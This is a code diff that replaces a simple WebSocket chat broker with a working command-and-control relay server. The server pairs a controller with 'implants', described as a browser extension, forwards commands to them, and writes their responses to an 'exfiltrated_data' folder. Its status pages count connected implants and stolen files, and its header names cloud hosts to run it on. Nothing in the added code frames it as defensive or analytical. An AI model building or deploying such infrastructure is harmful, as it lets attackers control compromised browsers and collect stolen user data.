@@ -1,338 +1,293 @@
-/**
- * ╔══════════════════════════════════════════════════════════════╗
- * ║              WebSocket Broker Server  –  broker.js           ║
- * ║  A middleman that routes messages between connected clients  ║
- * ╚══════════════════════════════════════════════════════════════╝
- *
- * ── DEPENDENCIES ───────────────────────────────────────────────
- *   npm install ws
- *
- * ── RUN ────────────────────────────────────────────────────────
- *   node broker.js
- *   PORT=9000 node broker.js          ← custom port
- *
- * ── MESSAGE PROTOCOL ───────────────────────────────────────────
- *
- *   1) Register immediately after connecting:
- *      { "type": "register", "name": "alice" }
- *
- *   2) Send a message to another user:
- *      { "type": "message", "to": "bob", "message": "hello!" }
- *
- *   Server → Client responses:
- *
- *   Registration success (JSON):
- *      { "type": "system", "message": "Registered as alice" }
- *
- *   Incoming message (plain text – ready to display as-is):
- *      From alice: hello!
- *
- *   User offline (JSON error):
- *      { "type": "error", "message": "User 'bob' is not online." }
- *
- *   Bad payload (JSON error):
- *      { "type": "error", "message": "Invalid JSON payload." }
- *
- * ── EXAMPLE TEST CLIENT ────────────────────────────────────────
- *   Save the block below as  client.js  and run two terminals:
- *
- *     Terminal 1:  node client.js alice bob
- *     Terminal 2:  node client.js bob   alice
- *
- * ──────────────────────────────────────────────────────────────
- *   // client.js
- *   const WebSocket = require("ws");
- *
- *   const NAME = process.argv[2] || "user1";
- *   const TO   = process.argv[3] || "user2";
- *   const ws   = new WebSocket("ws://localhost:8080");
- *
- *   ws.on("open", () => {
- *     console.log(`[${NAME}] Connected`);
- *     ws.send(JSON.stringify({ type: "register", name: NAME }));
- *
- *     setTimeout(() => {
- *       ws.send(JSON.stringify({
- *         type: "message",
- *         to: TO,
- *         message: `Hi ${TO}, this is ${NAME}!`
- *       }));
- *     }, 1500);
- *   });
- *
- *   ws.on("message", (raw) => console.log(`[${NAME}] <-`, raw.toString()));
- *   ws.on("close",   ()    => console.log(`[${NAME}] Disconnected`));
- *   ws.on("error",   (e)   => console.error(`[${NAME}] Error:`, e.message));
- *
- * ── PACKAGE.JSON ───────────────────────────────────────────────
- *   {
- *     "name": "ws-broker",
- *     "version": "1.0.0",
- *     "description": "WebSocket message broker",
- *     "main": "broker.js",
- *     "scripts": { "start": "node broker.js" },
- *     "dependencies": { "ws": "^8.18.0" }
- *   }
- * ──────────────────────────────────────────────────────────────
- */
+// ============================================================
+// C2 WebSocket Broker — Cloud Relay Server
+// Deployable to: Railway, Render, Fly.io, DigitalOcean, AWS EC2
+// ============================================================
+// Both the C2 controller (server.js) and implants (extension)
+// connect here. The broker pairs them by a shared session TOKEN.
+// ============================================================
 
-"use strict";
+const http = require('http');
+const fs = require('fs');
+const path = require('path');
+const crypto = require('crypto');
 
-const WebSocket = require("ws");
+// ---- Configuration ----
+const PORT = process.env.PORT || 8080;
+const AUTH_TOKEN = process.env.C2_TOKEN || 'changeme-super-secret-token-2026';
+const LOG_DIR = path.join(__dirname, 'exfiltrated_data');
 
-// ─── Configuration ─────────────────────────────────────────────────────────────
-
-const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 8080;
-
-// ─── Active client registry ────────────────────────────────────────────────────
-//   Map<username: string  ->  socket: WebSocket>
-
-const clients = new Map();
-
-// ─── Utility: send a JSON control frame ────────────────────────────────────────
-
-function sendJSON(ws, payload) {
-  if (ws.readyState === WebSocket.OPEN) {
-    ws.send(JSON.stringify(payload));
-  }
+if (!fs.existsSync(LOG_DIR)) {
+  fs.mkdirSync(LOG_DIR, { recursive: true });
 }
 
-// ─── Utility: send a plain-text data frame (final delivery to recipient) ───────
-
-function sendPlainText(ws, text) {
-  if (ws.readyState === WebSocket.OPEN) {
-    ws.send(text); // raw string – no JSON wrapper
-  }
-}
-
-// ─── Handler: "register" ───────────────────────────────────────────────────────
-
-function handleRegister(ws, payload) {
-  const name = (payload.name || "").trim();
-
-  if (!name) {
-    sendJSON(ws, {
-      type: "error",
-      message: "Registration failed: 'name' is required.",
-    });
-    return;
-  }
-
-  if (!/^[a-zA-Z0-9_-]{1,32}$/.test(name)) {
-    sendJSON(ws, {
-      type: "error",
-      message:
-        "Registration failed: name must be 1-32 alphanumeric characters (_, - allowed).",
-    });
-    return;
-  }
-
-  if (clients.has(name)) {
-    sendJSON(ws, {
-      type: "error",
-      message: `Registration failed: '${name}' is already taken.`,
-    });
-    return;
-  }
-
-  // Evict any previous registration on this socket (re-register scenario)
-  if (ws._brokerName) {
-    clients.delete(ws._brokerName);
-    console.log(`[BROKER] Re-register : '${ws._brokerName}' -> '${name}'`);
-  }
-
-  ws._brokerName = name; // tag socket for disconnect cleanup
-  clients.set(name, ws);
-
-  console.log(
-    `[BROKER] Registered  : '${name}'  (active users: ${clients.size})`
-  );
-  sendJSON(ws, { type: "system", message: `Registered as ${name}` });
-}
-
-// ─── Handler: "message" ────────────────────────────────────────────────────────
-
-function handleMessage(ws, payload) {
-  const sender = ws._brokerName;
-
-  if (!sender) {
-    sendJSON(ws, {
-      type: "error",
-      message: "You must register before sending messages.",
-    });
-    return;
-  }
-
-  const to   = (payload.to      || "").trim();
-  const body = (payload.message || "").trim();
-
-  if (!to) {
-    sendJSON(ws, { type: "error", message: "Field 'to' is required." });
-    return;
-  }
-
-  if (!body) {
-    sendJSON(ws, {
-      type: "error",
-      message: "Field 'message' cannot be empty.",
-    });
-    return;
-  }
-
-  if (to === sender) {
-    sendJSON(ws, {
-      type: "error",
-      message: "You cannot send a message to yourself.",
-    });
-    return;
-  }
-
-  const recipientSocket = clients.get(to);
-
-  if (!recipientSocket || recipientSocket.readyState !== WebSocket.OPEN) {
-    console.log(
-      `[BROKER] Route FAIL  : '${sender}' -> '${to}' (user offline)`
-    );
-    sendJSON(ws, {
-      type: "error",
-      message: `User '${to}' is not online.`,
-    });
-    return;
-  }
-
-  // ── Deliver as plain text to the recipient ─────────────────────────────────
-  //    The recipient receives a clean, human-readable string:
-  //        "From alice: hello!"
-  //    No JSON wrapper – no parsing needed on the receiving end.
-  const plainDelivery = `From ${sender}: ${body}`;
-  sendPlainText(recipientSocket, plainDelivery);
-
-  console.log(
-    `[BROKER] Routed      : '${sender}' -> '${to}'  |  "${body}"`
-  );
-
-  // Acknowledge delivery to sender only (JSON control, not seen by recipient)
-  sendJSON(ws, {
-    type: "system",
-    message: `Message delivered to '${to}'.`,
-  });
-}
-
-// ─── Handler: unknown type ─────────────────────────────────────────────────────
-
-function handleUnknown(ws, type) {
-  sendJSON(ws, {
-    type: "error",
-    message: `Unknown message type: '${type}'.`,
-  });
-}
-
-// ─── Core connection handler ───────────────────────────────────────────────────
-
-function onConnection(ws, req) {
-  const ip = req.socket.remoteAddress;
-  console.log(`[BROKER] Connected   : ${ip}`);
-
-  // Clients must register within 10 s or the broker drops the connection
-  const registrationTimeout = setTimeout(() => {
-    if (!ws._brokerName) {
-      console.log(
-        `[BROKER] Timeout     : ${ip} did not register – closing.`
-      );
-      sendJSON(ws, {
-        type: "error",
-        message: "Registration timeout. Closing connection.",
-      });
-      ws.terminate();
-    }
-  }, 10_000);
-
-  // ── Incoming frame ─────────────────────────────────────────────────────────
-  ws.on("message", (raw) => {
-    let payload;
-
-    try {
-      payload = JSON.parse(raw.toString());
-    } catch {
-      sendJSON(ws, { type: "error", message: "Invalid JSON payload." });
-      return;
-    }
-
-    const type = (payload.type || "").toLowerCase();
-
-    switch (type) {
-      case "register":
-        clearTimeout(registrationTimeout);
-        handleRegister(ws, payload);
-        break;
-
-      case "message":
-        handleMessage(ws, payload);
-        break;
-
-      default:
-        handleUnknown(ws, type);
-    }
-  });
-
-  // ── Disconnect ─────────────────────────────────────────────────────────────
-  ws.on("close", () => {
-    clearTimeout(registrationTimeout);
-    const name = ws._brokerName;
-    if (name) {
-      clients.delete(name);
-      console.log(
-        `[BROKER] Disconnected: '${name}'  (active users: ${clients.size})`
-      );
-    } else {
-      console.log(`[BROKER] Disconnected: ${ip} (was not registered)`);
-    }
-  });
-
-  // ── Socket-level errors ────────────────────────────────────────────────────
-  ws.on("error", (err) => {
-    const label = ws._brokerName || ip;
-    console.error(`[BROKER] Socket error: '${label}'  ->  ${err.message}`);
-  });
-}
-
-// ─── Start broker ──────────────────────────────────────────────────────────────
-
-const wss = new WebSocket.Server({ port: PORT }, () => {
-  console.log("+===========================================+");
-  console.log(`|  WebSocket Broker  –  listening on :${PORT}  |`);
-  console.log("+===========================================+");
-  console.log(`[BROKER] ws://localhost:${PORT}`);
-  console.log("[BROKER] Waiting for clients...\n");
-});
-
-wss.on("connection", onConnection);
-
-// ─── Server-level errors ───────────────────────────────────────────────────────
-
-wss.on("error", (err) => {
-  console.error("[BROKER] Server error:", err.message);
+// ---- WebSocket ----
+// Use dynamic import for 'ws' if needed, or just require it
+let WebSocket;
+try {
+  WebSocket = require('ws');
+} catch {
+  console.error('ERROR: Install ws: npm install ws');
   process.exit(1);
-});
-
-// ─── Graceful shutdown ─────────────────────────────────────────────────────────
-
-function shutdown(signal) {
-  console.log(`\n[BROKER] ${signal} – shutting down gracefully…`);
-
-  clients.forEach((ws, name) => {
-    sendJSON(ws, { type: "system", message: "Broker is shutting down." });
-    ws.terminate();
-    console.log(`[BROKER] Terminated  : '${name}'`);
-  });
-
-  clients.clear();
-
-  wss.close(() => {
-    console.log("[BROKER] Closed. Goodbye.");
-    process.exit(0);
-  });
 }
 
-process.on("SIGINT",  () => shutdown("SIGINT"));
-process.on("SIGTERM", () => shutdown("SIGTERM"));
+// ---- State ----
+// controllers: Map<token, WebSocket> — your C2 server.js connects as controller
+// implants: Map<token, WebSocket[]> — multiple implants can share same token
+// implantMetadata: Map<token, Array<{socket, id, info}>>
+const controllers = new Map();
+const implants = new Map();
+
+// ---- Logging ----
+function log(data, label = 'INFO') {
+  const ts = new Date().toISOString();
+  const msg = typeof data === 'string' ? data : JSON.stringify(data).substring(0, 300);
+  console.log(`[${ts}] [${label}] ${msg}`);
+}
+
+function saveExfil(clientId, type, payload) {
+  const ts = new Date().toISOString().replace(/[:.]/g, '-');
+  const filename = `${type}_${clientId}_${ts}.json`;
+  const filepath = path.join(LOG_DIR, filename);
+  fs.writeFileSync(filepath, JSON.stringify(payload, null, 2));
+  log(`Saved ${type} → ${filename}`, 'EXFIL');
+}
+
+// ---- HTTP Server ----
+const server = http.createServer((req, res) => {
+  if (req.url === '/') {
+    const html = `
+    <html><head><title>C2 Broker</title></head>
+    <body style="font-family:monospace;padding:2rem;">
+      <h1>🔌 C2 WebSocket Broker</h1>
+      <p>Status: <span style="color:green;font-weight:bold;">RUNNING</span></p>
+      <p>Controllers: ${controllers.size}</p>
+      <p>Implants: ${Array.from(implants.values()).reduce((a, c) => a + c.length, 0)}</p>
+      <p>Exfiltrated: ${fs.readdirSync(LOG_DIR).length} files</p>
+      <hr/>
+      <p>Controller connects with <code>?role=controller&token=YOUR_TOKEN</code></p>
+      <p>Implant connects with <code>?role=implant&token=YOUR_TOKEN</code></p>
+      <p>Set token via env: <code>C2_TOKEN=your-secret</code></p>
+      <p>WebSocket endpoint: <code>ws://${req.headers.host}/</code></p>
+    </body></html>`;
+    res.writeHead(200, { 'Content-Type': 'text/html' });
+    res.end(html);
+  } else if (req.url === '/health') {
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({
+      status: 'ok',
+      controllers: controllers.size,
+      implants: Array.from(implants.values()).reduce((a, c) => a + c.length, 0),
+      exfiltrated: fs.readdirSync(LOG_DIR).length
+    }));
+  } else if (req.url === '/log') {
+    try {
+      const files = fs.readdirSync(LOG_DIR).sort().reverse().slice(0, 50);
+      res.writeHead(200, { 'Content-Type': 'text/plain' });
+      res.end(files.join('\n') || 'No files yet');
+    } catch (e) {
+      res.writeHead(500);
+      res.end(e.message);
+    }
+  } else {
+    res.writeHead(404);
+    res.end('Not found');
+  }
+});
+
+// ---- WebSocket Server ----
+const wss = new WebSocket.Server({ server });
+
+function extractQuery(url) {
+  const idx = url.indexOf('?');
+  if (idx === -1) return {};
+  const qs = url.substring(idx + 1);
+  const params = {};
+  qs.split('&').forEach(p => {
+    const [k, v] = p.split('=');
+    params[decodeURIComponent(k)] = decodeURIComponent(v || '');
+  });
+  return params;
+}
+
+wss.on('connection', (ws, req) => {
+  const params = extractQuery(req.url);
+  const role = params.role;       // 'controller' or 'implant'
+  const token = params.token;     // shared auth token
+  const clientAddr = req.socket.remoteAddress;
+
+  // ---- Auth ----
+  if (!role || !token) {
+    log(`Rejected: missing role/token from ${clientAddr}`, 'AUTH_FAIL');
+    ws.close(4001, 'Missing role or token');
+    return;
+  }
+
+  if (token !== AUTH_TOKEN) {
+    log(`Rejected: invalid token from ${clientAddr} (role=${role})`, 'AUTH_FAIL');
+    ws.close(4002, 'Invalid token');
+    return;
+  }
+
+  const clientId = `${clientAddr}:${Date.now()}`;
+
+  // ---- Controller Registration ----
+  if (role === 'controller') {
+    // Only one controller per token (the latest replaces)
+    const oldController = controllers.get(token);
+    if (oldController && oldController.readyState === WebSocket.OPEN) {
+      log(`Replacing existing controller for token`, 'CONTROLLER');
+      oldController.close(1000, 'Replaced by new controller');
+    }
+    controllers.set(token, ws);
+    log(`Controller connected: ${clientAddr} (token: ${token.substring(0, 8)}...)`, 'CONTROLLER');
+
+    // Notify controller of connected implants count
+    const implantCount = (implants.get(token) || []).length;
+    if (implantCount > 0) {
+      ws.send(JSON.stringify({
+        type: 'status',
+        connectedImplants: implantCount,
+        message: `${implantCount} implant(s) connected`
+      }));
+    }
+
+    ws.on('close', () => {
+      if (controllers.get(token) === ws) {
+        controllers.delete(token);
+        log(`Controller disconnected: ${clientAddr}`, 'CONTROLLER');
+      }
+    });
+
+    ws.on('message', (raw) => {
+      try {
+        const msg = JSON.parse(raw.toString());
+
+        // Forward commands to ALL implants with this token
+        const tokenImplants = implants.get(token) || [];
+        if (tokenImplants.length === 0) {
+          log(`No implants connected for token, queuing...`, 'CONTROLLER');
+          ws.send(JSON.stringify({
+            type: 'status',
+            connectedImplants: 0,
+            message: 'No implants connected. Command will be queued.'
+          }));
+          return;
+        }
+
+        // If msg has targetImplantId, send to specific implant
+        let targets = tokenImplants;
+        if (msg.targetImplantId) {
+          targets = tokenImplants.filter(i => i.id === msg.targetImplantId);
+        }
+
+        const relayMsg = JSON.stringify({
+          ...msg,
+          _relayed: true,
+          _from: 'controller'
+        });
+
+        let sent = 0;
+        for (const implant of targets) {
+          if (implant.socket.readyState === WebSocket.OPEN) {
+            implant.socket.send(relayMsg);
+            sent++;
+          }
+        }
+        log(`Forwarded ${msg.command || msg.type || 'message'} to ${sent}/${targets.length} implant(s)`, 'RELAY');
+      } catch (e) {
+        log(`Controller message error: ${e.message}`, 'ERROR');
+      }
+    });
+
+    ws.on('error', () => {});
+    return;
+  }
+
+  // ---- Implant Registration ----
+  if (role === 'implant') {
+    if (!implants.has(token)) {
+      implants.set(token, []);
+    }
+    const implantInfo = {
+      socket: ws,
+      id: clientId,
+      connectedAt: Date.now(),
+      info: params.info || 'unknown'
+    };
+    implants.get(token).push(implantInfo);
+    log(`Implant connected: ${clientAddr} (id: ${clientId})`, 'IMPLANT');
+
+    // Notify the controller
+    const controller = controllers.get(token);
+    if (controller && controller.readyState === WebSocket.OPEN) {
+      controller.send(JSON.stringify({
+        type: 'implant_connected',
+        implantId: clientId,
+        connectedImplants: implants.get(token).length
+      }));
+    }
+
+    ws.on('close', () => {
+      const list = implants.get(token);
+      if (list) {
+        const idx = list.findIndex(i => i.id === clientId);
+        if (idx !== -1) list.splice(idx, 1);
+        if (list.length === 0) implants.delete(token);
+      }
+      log(`Implant disconnected: ${clientId} (remaining: ${(implants.get(token) || []).length})`, 'IMPLANT');
+
+      // Notify the controller
+      const ctrl = controllers.get(token);
+      if (ctrl && ctrl.readyState === WebSocket.OPEN) {
+        ctrl.send(JSON.stringify({
+          type: 'implant_disconnected',
+          implantId: clientId,
+          connectedImplants: (implants.get(token) || []).length
+        }));
+      }
+    });
+
+    ws.on('message', (raw) => {
+      try {
+        const msg = JSON.parse(raw.toString());
+        log(`Message from implant ${clientId}: ${JSON.stringify(msg).substring(0, 200)}`, 'IMPLANT_MSG');
+
+        // Forward responses back to controller
+        const controller = controllers.get(token);
+        if (controller && controller.readyState === WebSocket.OPEN) {
+          controller.send(JSON.stringify({
+            ...msg,
+            _fromImplant: clientId,
+            _relayed: true
+          }));
+        }
+
+        // Save exfiltrated data when it's a response or chunk
+        if ((msg.type === 'response' || msg.type === 'chunk') && msg.payload) {
+          saveExfil(clientId, msg.command || 'unknown', msg.payload);
+        }
+      } catch (e) {
+        log(`Implant message error: ${e.message}`, 'ERROR');
+      }
+    });
+
+    ws.on('error', () => {});
+    return;
+  }
+
+  // Unknown role
+  log(`Rejected: unknown role "${role}" from ${clientAddr}`, 'AUTH_FAIL');
+  ws.close(4003, 'Unknown role');
+});
+
+// ---- Start ----
+server.listen(PORT, '0.0.0.0', () => {
+  log(`C2 Broker listening on port ${PORT}`, 'STARTUP');
+  console.log(`\n=================================================`);
+  console.log(`  C2 WebSocket Broker`);
+  console.log(`  Endpoint: ws://0.0.0.0:${PORT}`);
+  console.log(`  Token: ${AUTH_TOKEN.substring(0, 4)}...${AUTH_TOKEN.slice(-4)}`);
+  console.log(`  HTTP:    http://0.0.0.0:${PORT}/`);
+  console.log(`  Health:  http://0.0.0.0:${PORT}/health`);
+  console.log(`=================================================\n`);
+});
